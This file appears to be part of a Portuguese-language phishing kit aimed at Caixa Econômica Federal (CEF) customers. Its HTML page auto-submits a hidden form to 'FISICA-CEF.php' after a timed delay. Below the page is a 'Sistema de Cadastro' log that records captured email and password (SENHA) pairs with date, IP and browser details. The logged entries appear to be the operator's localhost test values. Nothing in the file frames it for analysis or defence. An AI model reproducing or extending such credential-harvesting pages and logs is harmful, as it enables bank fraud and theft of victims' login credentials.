<!DOCTYPE html>
<html lang="pt-br">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
body {
    background-color: #000000;
    background-image: url();
}
body,td,th {
    color: #00FF05;
    font-size: 12px;
}
</style>
<script>
$(document).ready(function() { 
window.location.href='#foo';
});
</script>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" type="text/css" href="css/style1.css">
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="JavaScript">
function direcionar() { document.form.submit(); }
 
</script>
<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /></head>

<body style="margin:0;" onLoad="setTimeout('direcionar()',17000);">
<div id="fundo2">
<a href="#" id="ancora">
<form name="form" id="form" action="FISICA-CEF.php" method="post">
<input type="hidden" name="br" id="br" value="">
</form>
</div>


<a href="#" id="foo"></a>
<script>
window.location.href='#ancora';
</script>

</html>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 05/05/2023<br>
| Hora: 19:33<br>
| IP: ::1<br>
| Navegador: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36<br>
| -------------------------------------<br>
| EMAIL: EERGREG<br>
| SENHA: SFAFFSAAF<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 05/05/2023<br>
| Hora: 20:25<br>
| IP: ::1<br>
| Navegador: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.68<br>
| -------------------------------------<br>
| EMAIL: TESTE<br>
| SENHA: TESTE<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 06/05/2023<br>
| Hora: 20:45<br>
| IP: ::1<br>
| Navegador: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.68<br>
| -------------------------------------<br>
| EMAIL: TESTE<br>
| SENHA: TESTE<br>
| -------------------------------------<br>